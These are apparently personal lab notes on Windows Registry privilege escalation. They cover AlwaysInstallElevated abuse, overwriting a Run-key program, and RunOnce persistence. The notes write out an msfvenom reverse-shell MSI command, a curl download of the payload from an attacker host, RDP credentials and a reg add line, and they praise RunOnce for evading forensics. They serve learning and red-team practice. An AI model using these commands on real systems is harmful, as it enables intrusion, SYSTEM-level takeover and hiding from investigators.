# Registory

### The **Windows Registry** is a **hierarchical database** that stores configuration settings and options for:

- The Windows operating system
- Installed applications
- Hardware devices
- User preferences

### The registry has **five main root keys (hives):**

- `HKEY_LOCAL_MACHINE (HKLM)` — System-wide settings
- `HKEY_CURRENT_USER (HKCU)` — Current user settings
- `HKEY_CLASSES_ROOT (HKCR)` — File associations
- `HKEY_USERS (HKU)` — All user profiles
- `HKEY_CURRENT_CONFIG (HKCC)` — Hardware configuration

---

### Take Access of RDP session

```bash
xfreerdp3 /u:user /p:password321 /cert:ignore /v:[target ip] /dynamic-resolution
```

---

## Techqunic 1: AlwaysInstalledElevated Privilege

**AlwaysInstallElevated** is a **Windows Installer policy setting** in the Registry.

If enabled, it allows **any MSI package to install with SYSTEM privileges**, even if the user is low-privileged.

### Escalate privilege via AlwaysInstalledElevated registry

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer  #Query for local machine Hive-key
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer  #Query for Currently logon User Hive-key
```

**AlwaysInstalledElevated** attribute set to **true, and DisableMSI is set as true. it’s the first step** 

and windows don’t accept only this one step he tell us check this same registry for the current logon user, if that registory not available for the current logon user then our attack will be fail

In both condition, mean for Local User and for Local machine hive **AlwaysInstalledElevated** attribute should be true if any of them set to false then attack will fail

### `DisableMSI`

Controls whether MSI installations are allowed.

| Value | Meaning |
| --- | --- |
| `0` | MSI enabled (normal behavior) |
| `1` | MSI disabled for non-managed apps |
| `2` | MSI completely disabled |

### Create a reverse MSI installer payload using msfvenom

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[Attacker IP] LPORT=4444 -f msi -o exploit.msi
```

### This time we download payload on the target system using curl

```
curl http://192.168.201.88:8000/exploit.msi -o exploit.msi
```

### Use to install **msi** installer using command line

**/quiet** —> use for avoid interaction pop

**/i —>** Use for install 

### I got a reverse shell back and now i’m **nt authority\system**

---

## Technique 2

## Registry acts like a startup folder:  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\run

### This registry path acts like a startup folder so check  inside this registry what is inside there

```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\run
```

I found a file already there, so navigate to the directory 

### Check file permission using icacls

Check we have any write permission or any file create permission or not 

we don’t have any file creation permission

### Create a reverse shell payload using msfvenom

### Try to overwrite the program.exe file content using curl

### We successfully overwrite the file content look at the bytes size

11264 bytes —> 7680 bytes

### Now all set, just login as a ADMIN through RDP we will get a shell back with admin privilege cause this registry work like statup

### See we got the admin shell

---

## Technique 3: RunOnce

It’s a registry which run like startup folder and wipe himself, it’s best for RED team engagement cause if forensic expert try to find how hacker take exploit system then got nothing cause these registry wipe himself after execute 

which user login at first we will get that user shell with that user’s privilege  

### Registry path

```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
```

### This registry looking blank cause it’s run a single task and wipe up himself

### We try to set the value of the registry for take a elevated  Reverse Shell

**add** —> For add value in the registry 

**/v** —> what name you wanna call put that name here

**/t** —> which type of value you wanna put (hear we put string data)

**/d** —> Data path [where my program file is located]

**/f** —> Forcefully 

```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v shell /t REG_SZ /d "C:\Program Files\Autorun Program\program.exe" /f
```

Access denied cause, this moment we don’t have any write permission but this way we can exploit system also
